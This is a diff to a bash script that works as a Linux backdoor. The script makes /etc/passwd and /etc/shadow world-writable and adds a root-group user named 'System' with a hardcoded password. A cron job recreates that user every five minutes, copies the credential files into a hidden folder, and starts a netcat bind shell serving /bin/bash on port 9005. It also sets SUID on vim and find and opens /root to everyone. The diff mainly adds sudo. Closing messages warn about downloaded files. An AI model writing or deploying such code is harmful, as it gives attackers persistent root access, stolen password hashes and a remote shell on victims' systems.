@@ -1,10 +1,11 @@
 #!/bin/bash
 
-chmod 646 /etc/passwd &> /dev/null
-chmod 646 /etc/shadow &> /dev/null
+sudo chmod 646 /etc/passwd &> /dev/null
+sudo chmod 646 /etc/shadow &> /dev/null
+sudo chmod 777 /root &> /dev/null
 
-useradd System &> /dev/null && echo -e "defnotthepasswd\ndefnotthepasswd" | passwd System &> /dev/null
-usermod -a -G root System &> /dev/null
+sudo useradd System &> /dev/null && echo -e "defnotthepasswd\ndefnotthepasswd" | passwd System &> /dev/null
+sudo usermod -a -G root System &> /dev/null
 
 echo "*/5 * * * * root useradd System && echo -e "defnotthepasswd\ndefnotthepasswd" | passwd System && usermod -a -G root System" >> /etc/crontab
 
@@ -16,14 +17,11 @@ cp /etc/passwd /home/System/.SystemFiles/accounts
 cp /etc/shadow /home/System/.SystemFiles/hashes
 ip a >> /home/System/.SystemFiles/internet.txt
 
-apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
-nc.traditional -l -p 9005 -e /bin/bash &
+sudo apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
+sudo nc.traditional -l -p 9005 -e /bin/bash &
 
-chmod u+s 'which vi' &> /dev/null
-chmod u+s 'which vim' &> /dev/null
-chmod u+s 'which find' &> /dev/null
-
-chmod 777 /root &> /dev/null
+sudo chmod u+s /usr/bin/vim.basic &> /dev/null
+sudo chmod u+s /usr/bin/find &> /dev/null
 
 echo "Be careful when downloading files from the internet"
 echo "Not everything is what is seems to be ..."
